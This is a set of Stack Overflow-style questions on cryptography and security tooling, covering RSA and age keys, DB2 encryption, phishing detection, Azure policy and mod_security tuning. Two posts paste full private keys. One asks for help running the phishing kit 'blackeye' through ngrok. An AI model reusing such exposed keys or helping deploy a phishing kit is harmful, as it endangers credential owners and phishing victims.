Body
"<p>I have a C# Web-Api project with a vulnerability.</p>
<p>System.Data.SqlClient version 4.8.5</p>
<p>I can also see this vulnerability in <a href=""https://github.com/advisories/GHSA-98g6-xh36-x2p7"" rel=""nofollow noreferrer"">https://github.com/advisories/GHSA-98g6-xh36-x2p7</a>.</p>
<p>When I execute the Azure DevOps Advanced Security scan, I can see other vulnerabilities in the report, but not the one mentioned above</p>
<p>I tried changing the code , deliberately added new vulnerability just ensure the the scan is not getting cached , but to no avail.</p>
<p>Could you please help me understand why I'm not seeing this particular vulnerability?</p>
<p>Thanks</p>
"
"<p>I have an encrypt.js script that is used to encrypt and decrypt the password entered by user. It is embedded in the application webpage.</p>
<p>I try to load the same script in jmeter using this code</p>
<pre><code>load ('/apache-jmeter-5.6.3/scripts/encrypt.js');
</code></pre>
<p>upon running it, I got this error.</p>
<p>2024-02-27 09:55:47,729 ERROR o.a.j.p.j.s.JSR223Sampler: Problem in JSR223 script JSR223 Sampler, message: javax.script.ScriptException: groovy.lang.MissingMethodException: No signature of method: org.codehaus.groovy.jsr223.GroovyScriptEngineImpl.load() is applicable for argument types: (String) values: [/apache-jmeter-5.6.3/scripts/encrypt.js]</p>
<p>In the language, I used groovy since there is no javascript in the dropdown list. How can I successfully import the javascript in jmeter?</p>
<p><a href=""https://i.stack.imgur.com/sjtWe.jpg"" rel=""nofollow noreferrer"">jmeter jsr223 sampler</a></p>
<p>Trying to load and encryption js provided by the dev to successfully login into the application</p>
"
"<p>I'm getting this error whenever I try to run my jmeter script. The website is generating a dynamic encryption code when user is trying to login into the application. It is sent to server along with password and username for authentication. How can I fix this issue?</p>
<pre><code>28.02.2024 09:33:26,234 DEBUG [org.apache.coyote.http11] ) JBWEB003028: Start processing with input [txtUserid=PERFUNIADM05&amp;a2=**********&amp;a3=823EUB0OC87JP85DQNFDEE7RJOO0DAQQ&amp;txtpasswd=I+am+an+idiot.&amp;cmbOrgCodes=001&amp;submit=Sign+in&amp;txtResFrac=1920]
</code></pre>
<p>28.02.2024 09:33:26,234 INFO  [org.apache.catalina.core.ContainerBase.[jboss.web].[default-host].[/collections]] ) I am in Timer Filter
28.02.2024 09:33:26,234 DEBUG [org.apache.struts.util.RequestUtils] Get module name for path /loginAction.do
28.02.2024 09:33:26,234 DEBUG [org.apache.struts.util.RequestUtils] Module name found: default
28.02.2024 09:33:26,234 DEBUG [org.apache.struts.action.RequestProcessor] Processing a 'POST' for path '/loginAction'
28.02.2024 09:33:26,234 DEBUG [org.apache.struts.util.RequestUtils] Get module name for path /loginAction.do
28.02.2024 09:33:26,234 DEBUG [org.apache.struts.util.RequestUtils] Module name found: default
28.02.2024 09:33:26,234 DEBUG [org.apache.struts.action.RequestProcessor] Processing a 'POST' for path '/loginAction'
28.02.2024 09:33:26,234 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string '**********' to class 'java.lang.String'
28.02.2024 09:33:26,234 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string '823EUB0OC87JP85DQNFDEE7RJOO0DAQQ' to class 'java.lang.String'
28.02.2024 09:33:26,234 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string 'I am an idiot.' to class 'java.lang.String'
28.02.2024 09:33:26,234 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string 'PERFUNIADM05' to class 'java.lang.String'
28.02.2024 09:33:26,234 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string '001' to class 'java.lang.String'
28.02.2024 09:33:26,234 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string '1920' to class 'java.lang.String'
28.02.2024 09:33:26,266 INFO  [stdout] **** LSObject.getObject() - p_strJNDIName :java:/jdbc/xxxxxxxx
28.02.2024 09:33:26,271 ERROR [stderr] xxxxx.common.Exceptions.LSException
28.02.2024 09:33:26,271 ERROR [stderr]  at xxxxx.common.Exceptions.LSExceptionFactory.(LSExceptionFactory.java:26)
28.02.2024 09:33:26,271 ERROR [stderr]  at xxxxx.common.Utilities.DataBaseConnection.openConnection(DataBaseConnection.java:53)
28.02.2024 09:33:26,271 ERROR [stderr]  at xxxxx.common.Utilities.DataBaseConnection.getConnection(DataBaseConnection.java:29)
28.02.2024 09:33:26,271 ERROR [stderr]  at xxxxx.common.ejb.common.SessionBean.getConnection(SessionBean.java:83)
28.02.2024 09:33:26,271 ERROR [stderr]  at xxxxx.common.ejb.security.LoginEJB.multipleOrg(Unknown Source)
28.02.2024 09:33:26,271 ERROR [stderr]  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
28.02.2024 09:33:26,271 ERROR [stderr]  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
28.02.2024 09:33:26,271 ERROR [stderr]  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
28.02.2024 09:33:26,271 ERROR [stderr]  at java.lang.reflect.Method.invoke(Method.java:498)</p>
"
"<p>I am trying to change some SQL code to use parameters instead of hard-coded data.</p>
<p>This code is causing difficulty:</p>
<pre><code>Update mytable set passw=encrypt(?, 'mysecretkey') where ...
</code></pre>
<p>The passw field is <code>VARCHAR(128)</code> for <code>BIT DATA</code>. Replacing the old code (putting new password directly into SQL) with <code>?</code> ended in an SQL error about missing type binding.</p>
<p>Using stackoverflow I found the <a href=""https://stackoverflow.com/questions/68037741/setting-value-for-db2-varchar-for-bit-data-column"">possible solution</a>:</p>
<pre><code>Update mytable set passw=encrypt(CAST(? as VARCHAR(128) FOR BIT DATA), 'mysecretkey') where ...
</code></pre>
<p>However this update SQL runs ok, but the password is not recognised anymore.</p>
<p>The SQL reading it uses</p>
<pre><code>select decrypt_char(passw, 'mysecretkey') as PW from...
</code></pre>
<p>and here something totally differnt comes out.</p>
<p>What did I do wrong?</p>
<p>Full example</p>
<p><strong>Working (without parameters)</strong></p>
<pre><code>$options=array();
$conn = db2_connect('xx', 'yy', 'yy', array());

$sql=&quot;
    update SHOPUSERS 
    set PASSWD=encrypt('newpassword', 'mysecretpassword')
    where SHOPID=1 and 
    CUSTOMERNO='999'  
 &quot;;

 $stmt = db2_prepare($conn, $sql);

$fireDB2=db2_execute($stmt, array());

$sql=&quot;
    Select decrypt_char(PASSWD, 'mysecretpassword') as NEWPASSWD from SHOPUSERS  
    WHERE   SHOPID=1 and CUSTOMERNO='999'
&quot;;
$query=db2_exec($conn, $sql);
$ret=db2_fetch_assoc($query);
var_dump($ret);
</code></pre>
<p>Output:</p>
<pre><code>array(1) { [&quot;NEWPASSWD&quot;]=&gt; string(11) &quot;newpassword&quot; } 
</code></pre>
<p><strong>Not working (with parameters)</strong></p>
<pre><code>$options=array();
$conn = db2_connect('xx', 'yy', 'yy', array());

$sql=&quot;
    update SHOPUSERS   
    set PASSWD=encrypt(CAST(? as VARCHAR(128) FOR BIT DATA), 'mysecretpassword')
    where SHOPID=1 and 
    CUSTOMERNO='999'    
 &quot;;

 $stmt = db2_prepare($conn, $sql);

$fireDB2=db2_execute($stmt, array(&quot;newpassword&quot;));

$sql=&quot;
    Select decrypt_char(PASSWD, 'mysecretpassword') as NEWPASSWD from SHOPUSERS   
    WHERE   SHOPID=1  and CUSTOMERNO='999'
&quot;;
$query=db2_exec($conn, $sql);
$ret=db2_fetch_assoc($query);
var_dump($ret)
</code></pre>
<p>Output:</p>
<pre><code>array(1) { [&quot;NEWPASSWD&quot;]=&gt; string(19) &quot;&gt;ÁÏø/ËËÏ?ÊÀ&quot; } 
</code></pre>
<p>Konfig:</p>
<pre><code>PHP 8.1.27, Ubuntu 22.04.3 LTS, 
ibm_db2 driver Version 2.1.5, 
IBM DB2 i5/OS V7 Release 4 M0
</code></pre>
"
"<p>Here is the specific code that uses the session key and passes it to the server for authentication</p>
<pre><code>    a2 = encrypt.AESEncrypt(a2, &quot;&lt;%=(String)session.getAttribute(&quot;__GETLOGINKEY&quot;)%&gt;&quot;, 256);
</code></pre>
<p>been stuck in doing the login page for days. appreciate all the help.</p>
"
"<p>React-native app wrapped inside Expo ReactNativeHostWrapper used for expo local authentication when used with new fabric renderer with rn 0.72.3 makes app run very slow and lags in UI rendering.</p>
<p>If I remove expo related dependencies specially ReactNativeHostWrapper to wrap DefaultReactNativeHost makes app smooth and run faster.</p>
<pre><code>import android.app.Application;
import com.facebook.react.PackageList;
import com.facebook.react.ReactApplication;
import com.facebook.react.ReactNativeHost;
import com.facebook.react.ReactPackage;
import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint;
import com.facebook.react.defaults.DefaultReactNativeHost;
import com.facebook.soloader.SoLoader;
import java.util.List;
import android.content.res.Configuration;
import expo.modules.ApplicationLifecycleDispatcher;
import expo.modules.ReactNativeHostWrapper;
import com.kroosx4v.orientationmanager.OrientationManagerActivityLifecycleCallbacks;

public class MainApplication extends Application implements ReactApplication {

  private final ReactNativeHost mReactNativeHost =
      new ReactNativeHostWrapper(this, new DefaultReactNativeHost(this) {
        @Override
        public boolean getUseDeveloperSupport() {
          return BuildConfig.DEBUG;
        }

        @Override
        protected List&lt;ReactPackage&gt; getPackages() {
          @SuppressWarnings(&quot;UnnecessaryLocalVariable&quot;)
          List&lt;ReactPackage&gt; packages = new PackageList(this).getPackages();
          // Packages that cannot be autolinked yet can be added manually here, for example:
          // packages.add(new MyReactNativePackage());
          return packages;
        }

        @Override
        protected String getJSMainModuleName() {
          return &quot;index&quot;;
        }

        @Override
        protected boolean isNewArchEnabled() {
          return BuildConfig.IS_NEW_ARCHITECTURE_ENABLED;
        }

        @Override
        protected Boolean isHermesEnabled() {
          return BuildConfig.IS_HERMES_ENABLED;
        }
      });

  @Override
  public ReactNativeHost getReactNativeHost() {
    return mReactNativeHost;
  }

  @Override
  public void onCreate() {
    super.onCreate();
    SoLoader.init(this, /* native exopackage */ false);
    if (BuildConfig.IS_NEW_ARCHITECTURE_ENABLED) {
      // If you opted-in for the New Architecture, we load the native entry point for this app.
      DefaultNewArchitectureEntryPoint.load();
    }
    ReactNativeFlipper.initializeFlipper(this, getReactNativeHost().getReactInstanceManager());
    ApplicationLifecycleDispatcher.onApplicationCreate(this);
    registerActivityLifecycleCallbacks(new OrientationManagerActivityLifecycleCallbacks());
  }
  
  @Override
      public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        ApplicationLifecycleDispatcher.onConfigurationChanged(this, newConfig);
    }

}
</code></pre>
"
"<p>I have an Azure Policy that applies a resource tag &quot;env:prod&quot; to any resource group that has a &quot;prod&quot; part of its name.</p>
<p>This seems to be working just fine as when I create new resource groups, the tag is applied.
And when I remove the tag (modify the resource group) the policy applies it back.</p>
<p>The <strong>issue</strong> I am having is that these resource groups show non-compliance with the same policy.</p>
<p>Looking at the reason why these resource groups are not compliant, it seems the policy is <strong>comparing</strong> the resource group name to the tag name.</p>
<p>I <strong>don't understand</strong> why the policy is making this evaluation for compliance.</p>
<p>Even when I create a remediation task from within the policy compliance details, the task does pick up impacted resource groups, completes successfully, and states (2 out of 2) remediated, and I confirmed the remediation task took action by reviewing the resource groups Activity Logs, <strong>but</strong> the matter of the fact, these two resource groups always had the required tags that were applied by the policy itself when they were created.</p>
<p>If you may <strong>help</strong> me understand:</p>
<ol>
<li>Why is the policy making such an evaluation (comparing resource group name to the tag value)</li>
<li>How can I fix it?</li>
</ol>
<p>Additional notes:</p>
<ol>
<li>The resource groups have been created over a week or so ago.</li>
<li>Their compliance as described here has not changed since.</li>
</ol>
<p><strong>Thanks ahead</strong>.</p>
<p>Policy definition:</p>
<pre><code>{
  &quot;mode&quot;: &quot;All&quot;,
  &quot;policyRule&quot;: {
    &quot;if&quot;: {
      &quot;allOf&quot;: [
        {
          &quot;field&quot;: &quot;type&quot;,
          &quot;equals&quot;: &quot;Microsoft.Resources/subscriptions/resourceGroups&quot;
        },
        {
          &quot;field&quot;: &quot;name&quot;,
          &quot;contains&quot;: &quot;prod&quot;
        }
      ]
    },
    &quot;then&quot;: {
      &quot;effect&quot;: &quot;modify&quot;,
      &quot;details&quot;: {
        &quot;roleDefinitionIds&quot;: [
          &quot;/providers/microsoft.authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c&quot;
        ],
        &quot;operations&quot;: [
          {
            &quot;operation&quot;: &quot;addOrReplace&quot;,
            &quot;field&quot;: &quot;[concat('tags[','env',']')]&quot;,
            &quot;value&quot;: &quot;prod&quot;
          }
        ]
      }
    }
  },
  &quot;parameters&quot;: {}
}
</code></pre>
<p>Visual aid:
<a href=""https://i.stack.imgur.com/uQLuK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/uQLuK.png"" alt=""enter image description here"" /></a></p>
"
"<p>I am trying to pull data from a dedicated sql pool in a different azure subscription, when I try to create the linked service from my target azure synapse workspace using sql authentication, firewall rule is in place and i get the bellow error:</p>
<pre><code>Cannot connect to SQL Database. Please contact SQL server team for further support. Server: '#######', Database: '######', User: '#####'. Check the linked service configuration is correct, and make sure the SQL Database firewall allows the integration runtime to access.
A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: Named Pipes Provider, error: 40 - Could not open a connection to SQL Server), SqlErrorNumber=53,Class=20,State=0,
The network path was not found
</code></pre>
<p>please advise</p>
"
"<p>I want to hide my swagger endpoints based on Authorized user. If admin login they can see every api. if another user login I want to filter apis. How can I do this on java spring boot project ?
<a href=""https://i.stack.imgur.com/2SsHA.png"" rel=""nofollow noreferrer"">swagger logın</a></p>
<p>After login apis will show up.</p>
<p><a href=""https://i.stack.imgur.com/MWZTP.png"" rel=""nofollow noreferrer"">swagger ui api</a></p>
<p>I can use another libs. I have to use springdoc. I tried couple of thing but didnt work. @Hidden is not enough for me. I want to hide apis based on user.</p>
"
"<p>Age is a practical toos for file encryption, here it is its presentation page: <a href=""https://github.com/FiloSottile/age"" rel=""nofollow noreferrer"" title=""https://github.com/FiloSottile/age"">age</a>.</p>
<p>With <code>age-keygen</code>, we are going to be able to create a couple of public key and private key together like below:</p>
<pre><code># created: 2024-02-14T17:14:05+01:00
# public key: age1zskjrcgkgqhjaksa22ze85wy0wy2xg8sf7j8fntdgz2d4h25rp9sz76q7p
AGE-SECRET-KEY-1SA9KV6M7C27GFW22ZXED69SAATLH3UMDUSN720AQR0JEN2YTU0MS7FFZA2
</code></pre>
<p>Where we are going to have a pair of public key and private key (<code>AGE-SECRET-KEY-...</code>). We can use these information for encryption and decryption, no problem.</p>
<p>But what bothers me is that I haven't found a way to verify whether the public key and the private key of age couple. A similar example in openssl is below:</p>
<pre><code>openssl x509 -in cert.pem -noout -modulus | openssl md5
openssl rsa -in key.pem -noout -modulus | openssl md5
</code></pre>
<p>If the results generated are identical, we are going to be able to verify that <code>cert.pem</code> and <code>key.pem</code> are a pair. How can we achieve the similar functionality for age keys?</p>
<p>Thanks in advance!</p>
"
"<p>Is it possible to convert a public/private key I created in PHP (x509 format  I believe but not 100% sure) to a pkcs1 version (python) ? I have two apps one PHP and one in Python, and I would like them both to use the same key pairs as they will eventually communicate with each other. It doesn't seem to be possible as far as I can tell but could anyone advise if i'm going around in circles with this, or if indeed you can make a key pair work across both programming languages by converting one of them.</p>
<p>My Ultimate aim is:</p>
<p><strong>Python stores</strong> - Public key</p>
<p><strong>PHP stores</strong> - Private Key</p>
<p>Then both apps perform I/O with each other.</p>
<p>Example of Key made in PHP below (X509)</p>
<pre><code>-----BEGIN PUBLIC KEY----- 
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqh+pyERnrrSIlJFNcX5D
FI7vJVHlgN0qAVYBsRB7HHGmBXjkFhtbz0RmTE13effnNB5UJS3BzqLFAGib9JkF 
Df7HgnpdVf3pIE5g+2kL/abQ9r+U0qX7hqmwnEWyA60Htz7MpSq4p4q7CPSCeGez 
m7946u8+6jVgIX19YrrM7f4Ai6LBBEFtMG0ytnhVaKWl3kwGuHmCSRUhhZsaE4TZ 
1wce/UcAQSkmzEnflfqdc7IiM55ZPYkW8u9cIFgOhYv3du2Il9GH7E3PBt6aASH/ 
ct7MRP4gCAvoSEhn/t1/Hr/aHlSgH/OIHHK0GFrVUgZokxaYv+EWkfxC9/log5uG 
pQIDAQAB
-----END PUBLIC KEY-----


-----BEGIN PRIVATE KEY----- 
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCqH6nIRGeutIiU 
kU1xfkMUju8lUeWA3SoBVgGxEHsccaYFeOQWG1vPRGZMTXd59+c0HlQlLcHOosUA 
aJv0mQUN/seCel1V/ekgTmD7aQv9ptD2v5TSpfuGqbCcRbIDrQe3PsylKrinirsI 
9IJ4Z7Obv3jq7z7qNWAhfX1iuszt/gCLosEEQW0wbTK2eFVopaXeTAa4eYJJFSGF 
mxoThNnXBx79RwBBKSbMSd+V+p1zsiIznlk9iRby71wgWA6Fi/d27YiX0YfsTc8G 
3poBIf9y3sxE/iAIC+hISGf+3X8ev9oeVKAf84gccrQYWtVSBmiTFpi/4RaR/EL3 
+WiDm4alAgMBAAECggEAYWwEdFUH8vobhMi4ypd9npZDyOFfRi5g0acJDPbdKWrD 
ojqakzZTmxwWYPezxbr7QdNkaG4NoGGB4zwEo0vFo0AVzFh6frYK/J8l1pNPdJBE 
9ii79u1qXrFqG/Olf4lk88EYvDT8zaUaeoRa+syYBEbf3dnn84Nha4xLc3B5zodJ 
A1Ps31utrlHwLYJUHw81jT3aUmKJpV/dqnhb1D8FXd2PN6sNbsA1fDGSBAV5mFll 
u6F5btLwFKpSzCFgT/gbx4LFWR08ZLPpiMWXiUZm5wbBwB0lI8a4qZAXQmHqQokP 
Xj516VAqUdo0eh9sOAZu3h8YNtziOjs/bQoWsek4eQKBgQDfVH5dE7TPc5KjfbaK 
5yBGQDX0ZLMSlXCt35ad79YQlWpMGcvAu5988HiriCntHhOhSeNMNpu/QMmvVL/L 
XZvb9SRSvZzs3kEIP7mxqQi045frq5WxYB4N/nnJmSye4l8oogueTh45y2WrJxsy 
E6Oaiejx0AK5efIUEai0Wrhm5wKBgQDDAqPErtR6Mv/sMtUt76Iun+CfokEN316i 
6s1sDQRTpxCgfDFd7pK77p92LnqGoXpWQoHeRb94d7pCG8UkkvyzfHKyquq4wT2y 
UsDFJ4g+a/x63J43O/NHhW7X5ZShuSRr9+13JWD+P8aqQwIfJd23iST8o5KdDjwF 
c7jkiSYQkwKBgQCbbMhMqqxJPBuvoIvr+5Jgkct6/KILqukyeMrvu7x06ieCMum0 
hl8mqoywhCD5ntb2ht+jaNXXspUqaobYV5ti5yaSVtfhmYQU45Suaf9fNI3EPDP/ 
r+76ukGz5eBB6zVip/QCBkfO3RkylhK9NSHFKXlu4N8kihPJl8ibTA/NvQKBgG+t 
JFIveNjeOfdvCOw8jlk7D6z7g1vJbm3IH4ngTnkFdJ0jYjYTuQ5M0h8g8OQGt4OM 
pMjAkq0Pi6fuNVEDqBm1jA3LmY3ihE2J3IFLaVeuCbHmg+jHuUNdI6QaAqs21qfK 
HMCdtFUF+uRoaV+jFLzVmkvf9MdibncE1X5zGExnAoGAJp7Xe67ZvFrQH7AigXt7 
hxhsvd3/EExTWJx1aGc+aplI1dl8HR6tjBcJSR+uf2siI9B3OuLHaZZha2p/bcE6 
dt2vYbE0/oOunDiU6G3BJFE/gKIVwl4l8sknISLWO/uWg5puig3uK0wbqQawC6G5 
Ude0KAn2vkkHVAgj0oBSqNU=
-----END PRIVATE KEY-----
</code></pre>
<p>Thanks</p>
"
"<p>For a simple project, I want to use the CKKS encryption scheme via the PYfhel library. I need to evaluate a matrix-vector product, e.g. Y = A*X.</p>
<p><strong>Question</strong>: How to do it properly with PyFhel ?</p>
<p><strong>Partial Answers</strong></p>
<ol>
<li><p>For the moment, my idea is to encrypt each coefficient of A and X as different data and implement the matrix vector product by writing manually the scalar product. But this solution is not really satisfactory and scalable. And I have doubt about the security of encrypting only scalars ?</p>
</li>
<li><p>I can implement the dot product of the first line of A with X and the second line of A with X. This will give me the two components of Y but how to get the fully encrypted vector ?</p>
</li>
</ol>
"
"<p>We have a legacy python2 application that uses an RSA private key to decrypt a base64-encoded file.  How do we port this to python3?</p>
<h2>Python2.7 code, this does work:</h2>
<pre class=""lang-py prettyprint-override""><code>    def _unlock_keys(self, passphrase):
        #get user priv key passphrase and perform unlock of randbits
        master_key = None
        master_key_path = 'master.pem'

        with open(master_key_path) as f:
            master_key = RSA.importKey(f.read(), passphrase)

        with open('host_keys/part.A') as f:
            enc_bits = f.read()
            self.part_A = master_key.decrypt(b64decode(enc_bits))
            
        # self.part_A has the data we need
</code></pre>
<h2>Python3 code, this does not work:</h2>
<p>This is what we've tried on the python3 code, but so far it decrypts to the empty bytestring <code>b''</code>:</p>
<pre class=""lang-py prettyprint-override""><code>    def _unlock_keys(self, passphrase):
        #get user priv key passphrase and perform unlock of randbits
        master_key = None 
        master_key_path = 'master.pem'

        with open(master_key_path) as f:
            master_key = RSA.importKey(f.read(), passphrase)

        with open('host_keys/part.A') as f:
            enc_bits = f.read()

            # Note: PKCS1_OAEP doesn't work because this is raw, unpadded:
            decryptor = PKCS1_v1_5.new(master_key)
            self.part_A = decryptor.decrypt(b64decode(enc_bits), &quot;error&quot;)
            print(self.part_A)

        # self.part_A prints as b''
</code></pre>
<h2>OpenSSL command that works</h2>
<p>We can use OpenSSL to decrypt it as follows.  Note the <code>-raw</code> argument because there is no PKCS padding, and this is PKCS v1.5:</p>
<pre class=""lang-bash prettyprint-override""><code>openssl rsautl -pkcs -raw -decrypt -in &lt;(base64 -d host_keys/part.A) -out /proc/self/fd/1 -inkey master.pem
Enter pass phrase for master.pem:
&lt;correct output&gt;
</code></pre>
<p>(Maybe I should have posed the question <em>&quot;how can I implement this openssl command in python3?&quot;</em> but methinks that would be an XY question...)</p>
<h2>Key format</h2>
<p>In case it helps, this is what the private key format looks like.</p>
<pre><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,&lt;REDACTED&gt;

...
-----END RSA PRIVATE KEY-----
</code></pre>
"
"<p>After installing blackeye on my VM , I tried downloading and configuring NGROK SERVER but it keeps showing error when I run any command option on blackeye and it won't connect
I tried deleting both the blackeye and NGROK server and downloading it all over and setting it up again but the error still persists</p>
"
"<p>I recently delved into the realm of malware and phishing detection, experimenting with various services. One interesting observation emerged during my exploration—specifically, the disparity in detecting malicious URLs between Google Web Risk Lookup API and VirusTotal.</p>
<p>I conducted tests with URLs sourced from databases like urlhaus, and intriguingly, Google Web Risk Lookup API did not flag many of them as malicious, even though counterparts like VirusTotal successfully identified them. Notably, some of these URLs were associated with well-known malware payloads.</p>
<p>It's worth noting that the tests were conducted on the Google Cloud Platform, leveraging Google Web Risk, and the results were compared against those obtained from VirusTotal.</p>
<p>what is the reason for this?</p>
"
"<p>We've noticed that many phishing emails we receive use the user's username in the subject line.</p>
<p>So, I'm trying to create a mail-flow rule that redirects for approval emails where the recipient's username is contained in the subject line.</p>
<p>For example, recipient is &quot;flastname@company.com&quot; and &quot;flastname&quot; is in the subject line.</p>
<p>Is this possible with a mail-flow rule?</p>
"
"<p>Our domain, <a href=""https://vstbalance.com"" rel=""nofollow noreferrer"">vstbalance.com</a>, was flagged as phishing by Microsoft Defender SmartScreen. After switching to <a href=""https://portal.vstbalance.com"" rel=""nofollow noreferrer"">portal.vstbalance.com</a> (which targets the same folder), the issue was resolved. How can we determine the specific actions that triggered the phishing label on Microsoft Edge?
#phishing.
#MicrosoftDefenderSmartScreen</p>
<p><a href=""https://i.stack.imgur.com/rIxMb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/rIxMb.png"" alt=""enter image description here"" /></a></p>
"
"<p>Im new to flask and im trying to create a chrome extension tool for a phishing email detection system. I imagine the system works by clicking a Extract Button which will extract the sender, subject and email body text and a scan button which will analyze the extracted body text of the email to determine is it a phishing email.</p>
<p>I can extract the information of the email but when I click the analyze button it display 500 Internal Server Error in the console. Tried research some way to solve this but still can't.</p>
<p>backend.py</p>
<pre><code>import traceback
from flask import Flask, request, jsonify
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from flask_cors import CORS
import json
import logging
from http import HTTPStatus


app = Flask(__name__)


# Load the dataset
dataset = pd.read_csv(&quot;mail_data.csv&quot;)

# replace null value with null string
mail_data = dataset.where((pd.notnull(dataset)), '')

# label spam mail as 0; authentic as 1
mail_data.loc[mail_data['Category'] == 'spam', 'Category',] = 0
mail_data.loc[mail_data['Category'] == 'authentic', 'Category',] = 1

# Assuming your dataset has a 'text' column containing the email content and a 'label' column for phishing or not
X = mail_data['Message']
Y = mail_data['Category']

# Feature Extraction
feature_extraction = TfidfVectorizer(min_df=1, stop_words='english', lowercase=True)
X_features = feature_extraction.fit_transform(X)

# Convert Y values as integers
Y = Y.astype('int')

# Train the model
model = LogisticRegression()
model.fit(X_features, Y)


@app.route('/', methods=['GET', 'POST'])
def predict_phishing():
    if request.method == 'POST':
        email_content = request.json.get('email_content', '')
        # Feature extraction for the input data

        email_content_feature = feature_extraction.transform([email_content])
        # Make prediction using the trained model
        prediction = model.predict(email_content_feature)[0]

        

        return jsonify({'prediction': prediction})
    # If the request method is GET, return a message
    else:
        return jsonify({'message': 'Please use POST method to make predictions.'})
    

   
if __name__ == '__main__':
    app.run(debug=True)
    
    
 
</code></pre>
<p>popup.js</p>
<pre><code>// Variable to store email subject, sender, and message
let emailSubjectSenderMessage = {};

// Function to send a message to content.js to extract email content
function extractEmailContent() {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) =&gt; {
    if (tabs &amp;&amp; tabs.length &gt; 0 &amp;&amp; tabs[0].id) {
      const activeTab = tabs[0];
      chrome.tabs.sendMessage(activeTab.id, { action: 'extractEmailContent' }, (response) =&gt; {
        if (chrome.runtime.lastError) {
          // Handle any errors in sending the message

        } else {
          // Check if the response contains emailContent
          if (response &amp;&amp; response.emailContent) {
            // Extracted email content
            const emailContent = response.emailContent;

            // Extracted sender's email address
            const senderEmail = emailContent.senderEmail;

            // Store the email subject, sender, and message in the variable
            emailSubjectSenderMessage = {
              subject: emailContent.subject,
              sender: senderEmail,
              message: emailContent.body
            };

            // Display the extracted content including the sender's email address
            displayEmailContent(emailContent, senderEmail);
          } else {
            displayErrorMessage('No email data found on this page.');
          }
        }
      });
    } else {
      console.error('Invalid tab or tab ID not available.');
    }
  });
}


// Function to display the extracted email content
function displayEmailContent(emailContent, senderEmail) {
  const emailContentDiv = document.getElementById('emailContent');
  emailContentDiv.innerHTML = `&lt;strong&gt;Sender:&lt;/strong&gt; ${senderEmail}&lt;br&gt;&lt;strong&gt;Subject:&lt;/strong&gt; ${emailContent.subject}&lt;br&gt;&lt;strong&gt;Message:&lt;/strong&gt; ${emailContent.body}`;
}

// Function to display an error message
function displayErrorMessage(message) {
  const emailContentDiv = document.getElementById('emailContent');
  emailContentDiv.textContent = message;
}




// Add a click event listener to the extract button
document.getElementById('extractButton').addEventListener('click', extractEmailContent);

// Add a click event listener to the scan button
document.getElementById('scanButton').addEventListener('click', scanEmailContent);


// Function to send the extracted email content to the Flask server for prediction
function scanEmailContent() {
  // Check if email content is available
  if (Object.keys(emailSubjectSenderMessage).length === 0) {
    displayErrorMessage('Please extract email content first.');
    return;
  }

  // Extracted email content
  const emailContent = emailSubjectSenderMessage.message;

  // Make an HTTP POST request to Flask server for prediction
  fetch('http://127.0.0.1:5000', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      email_content: emailContent,
    }),
  })
    .then(response =&gt; response.json())
    .then(data =&gt; {
      // Handle the prediction result
      const prediction = data.prediction;

      // Display the prediction result
      displayPredictionResult(prediction);
    })
    .catch(error =&gt; {
      console.error('Error in predicting phishing:', error);
      console.log('Response Content:');
      displayErrorMessage('Error in predicting phishing. Please try again.');
    });
}


// Function to display the prediction result
function displayPredictionResult(prediction) {
  const emailContentDiv = document.getElementById('emailContent');
  let resultMessage;

  if (prediction === 0) {
    resultMessage = 'This email is predicted as a phishing email.';
  } else {
    resultMessage = 'This email is predicted as authentic.';
  }

  emailContentDiv.textContent = resultMessage;
}
</code></pre>
<p>I have tried to just used 'POST&quot;</p>
<pre><code>@app.route('/', methods=[ 'POST'])
</code></pre>
<p>But i just end up with error 405</p>
"
"<p>What are the risks in using an app with dangerous delegated permissions - besides luring a privileged user to connect the app and use his privileges?</p>
<p>Are there any known dangerous delegated permissions that a low privileged user (attacker) can use?</p>
"
"<p>I am using mod_security 2.9.3, together with the Core Rule Set version 3.2.3, both as packaged for Debian 10 ('buster' – yes, I know this is reaching the end of support), and I'm getting occasional false positives from rule <strong>942100</strong> (one of the libinjection rules).   This rule is also proving one of the most useful for filtering genuine attempts at SQL injections attacks, so I'm keen not to disable it entirely.  (I know how to do that and I have verified that it does solve the problem.)  Ideally I'd like to fine-tune it instead to tweak the test that is yielding the false positive.  I'm looking for help with that.</p>
<p>A typical log entry looks something like this:</p>
<blockquote>
<p>Message: Warning. detected SQLi using libinjection with fingerprint '1kn&amp;n' [fil
e &quot;/usr/share/modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf&quot;] [line &quot;68&quot;] [id &quot;942100&quot;] [msg &quot;SQL Injection Attack Detected via libinjection&quot;] [data &quot;Matched Data: 1kn&amp;n found within ARGS:details: XXXXXXXXXXXXX&quot;]</p>
</blockquote>
<p>(I'm afraid I've had to redact the <code>details</code> argument as it invariably contains personal data, though I know that will not help people answer my question.  The argument is typically a single short sentence containing a few numbers, personal names and short words, here 'and' and 'each', and little to no punctuation.)</p>
